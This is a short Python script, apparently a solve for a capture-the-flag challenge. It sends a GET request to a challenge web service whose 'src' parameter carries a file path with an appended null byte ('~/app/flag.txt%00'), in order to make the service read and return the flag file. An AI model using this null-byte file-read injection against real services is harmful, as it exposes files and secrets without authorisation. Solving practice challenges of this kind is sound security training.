import requests

r = requests.get("https://uwuasaservice.amt.rs/uwuify?src=~/app/flag.txt%00")

print(r.text)